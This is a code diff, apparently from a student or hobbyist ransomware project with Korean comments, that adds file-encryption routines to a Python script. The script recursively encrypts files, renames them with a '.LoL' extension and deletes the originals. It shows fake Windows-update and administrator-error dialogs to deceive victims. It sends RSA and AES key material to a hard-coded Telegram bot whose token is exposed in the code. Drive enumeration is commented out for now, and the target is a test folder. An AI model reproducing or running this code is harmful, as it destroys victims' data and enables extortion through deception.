@@ -3,7 +3,9 @@ from nacl.public import PrivateKey, PublicKey, Box     #공개키암호
 import nacl, nacl.secret
 from datetime import datetime               #시간정보
 from time import sleep                      #딜레이
-import os, sys                              #파일 내부 디렉토리
+import os, sys, ctypes, tkinter                              #파일 내부 디렉토리
+from tkinter import messagebox
+import threading
 
 #0. 기본 환경설정
 #asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
@@ -21,6 +23,14 @@ AES_BOX=0
 
 BOT=telegram.Bot(token='6516628933:AAHr__4L6DnlSiBXptkMsKi8DhvPwanGrJQ')#봇 토큰
 CHAT_ID=5911780078#해커방
+
+EncryptModule=0
+
+MaxThread=120
+IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()
+
+PathList=[]
+PathList_DEBUG=[]
 
 #1. RSA개인키 생성_스크립트 인자로 key path를 입력받으면 해당 내용을 읽어 로드(.py "privatePath")
 def makeRSAKey():
@@ -93,7 +103,7 @@ def sendKeyToServer(encrypted_aes_key):
     loop.run_until_complete(sendTelegram(CHAT_ID, "ClientRSAPublicKey: ")) # 끝날 때까지 기다림
     #loop.close
     loop = asyncio.get_event_loop() 
-    loop.run_until_complete(sendTelegram(CHAT_ID, str(PRIVATE_KEY_RSA._private_key))) 
+    loop.run_until_complete(sendTelegram(CHAT_ID, str(PUBLIC_KEY_RSA))) 
     #loop.close
     loop = asyncio.get_event_loop()
     loop.run_until_complete(sendTelegram(CHAT_ID, "EncryptedClientAESKey: "))
@@ -102,6 +112,105 @@ def sendKeyToServer(encrypted_aes_key):
     loop.run_until_complete(sendTelegram(CHAT_ID, str(encrypted_aes_key)))
     #loop.close
     print('[DEBUG] Complete Sending')
+
+#6. 암호화 진행(현재 키 생성완료)
+class EnDecryptor:
+    def __init__(self, files=0, encryptModule=0):
+        self._files=files
+        self._encryptModule=encryptModule
+
+    def encryptFile(self):
+        try:
+            for file in self._files:
+                if(os.path.isfile(file)==True):
+                    if(file==sys.argv[0]):
+                        return
+
+                    with open(file, "rb") as File:
+                        data=File.read()
+                    encryptedFile=self._encryptModule.encrypt(data)
+                    with open(f"{file}.LoL", "wb") as File:
+                        File.write(encryptedFile)
+                    os.remove(file)
+                
+        except Exception as e:
+            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")
+
+    def decryptFile(self):
+        try:
+            for file in self._files:
+                originName=file.strip(".LoL")
+                if(os.path.isfile(file)==True):
+                    if(file==sys.argv[0]):
+                        return
+
+                    with open(file, "rb") as File:
+                        data=File.read()
+                    decryptedFile=self._encryptModule.decrypt(data)
+                    with open(originName, "wb") as File:
+                        File.write(decryptedFile)
+                    os.remove(file)
+                
+        except Exception as e:
+            print(f"[DEBUG] Error on EnDecrypt.decryptFile(): {e}")
+
+def setEncryptModule():
+    global EncryptModule
+    EncryptModule=nacl.secret.SecretBox(PRIVATE_KEY_AES)
+    print('[DEBUG] Created AES Modyle')
+
+def listUpTargetDir():
+    global PathList, PathList_DEBUG
+    #PathList=[r"C:\Users\\"]
+    #for letter in range(97, 123):
+    #    drive=f"{chr(letter)}:\\"
+    #    if (pathlib.Path(drive).exists()):
+    #        PathList.append(drive)
+    #PathList.remove("c:\\")
+    #print(f"[DEBUG] PathList: {PathList}")
+    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test"]#테스트용 타겟 경로
+
+def recursiveEncrypt(basepath):
+    files=[]
+    dirs=[]
+    for entry in os.listdir(basepath):
+        absolutePath=os.path.join(basepath, entry)
+        if os.path.isfile(absolutePath):
+            files.append(absolutePath)
+        elif os.path.isdir(absolutePath):
+            dirs.append(absolutePath)
+
+    if (len(files)>0):
+        EnDecryptor(files, EncryptModule).encryptFile()
+    for dir in dirs:
+        recursiveEncrypt(dir)
+
+def recursiveDecrypt(basepath):
+    files=[]
+    dirs=[]
+    for entry in os.listdir(basepath):
+        absolutePath=os.path.join(basepath, entry)
+        if os.path.isfile(absolutePath):
+            files.append(absolutePath)
+        elif os.path.isdir(absolutePath):
+            dirs.append(absolutePath)
+
+    if (len(files)>0):
+        EnDecryptor(files, EncryptModule).decryptFile()
+    for dir in dirs:
+        recursiveDecrypt(dir)
+
+#기타 함수
+def fakeAdmin():#관리자 권한 실행 유도
+    WINDOW=tkinter.Tk()
+    WINDOW.withdraw()
+    messagebox.showerror("Error", "Try to re-run as administrator")
+
+def fakeAlert():#관리자 권한 실행 유도
+    WINDOW=tkinter.Tk()
+    WINDOW.withdraw()
+    messagebox.showerror("Windows 업데이트 작업 중...", "컴퓨터를 끄지 마십시오")
+            
     
 if __name__=='__main__':
     makeRSAKey()
@@ -110,7 +219,27 @@ if __name__=='__main__':
     print()
     encrypted_aes_key=encryptAES()
     print()
-    sendKeyToServer(encrypted_aes_key)
+    #sendKeyToServer(encrypted_aes_key)
+    print()
+    setEncryptModule()
+    listUpTargetDir()
+
+    if(IsAdmin==False):#디버그를 위한 강제실행
+        #changeBackground()
+        task_thread = threading.Thread(target=fakeAlert)
+        task_thread.start()
+        for drive in PathList_DEBUG:
+            print("\n[DEBUG] ==============================================================================")
+            print("[DEBUG] 암호화가 10초 뒤 진행될 예정입니다. 타겟디렉토리를 마지막으로 확인하세요: ", drive)
+            print("[DEBUG] ==============================================================================\n")
+            sleep(10)
+            
+            recursiveEncrypt(drive)#암호화 수행
+            print("[DEBUG] 암호화 완료")
+            
+    else:
+        fakeAlert()
+    
     
     
     print('hello')
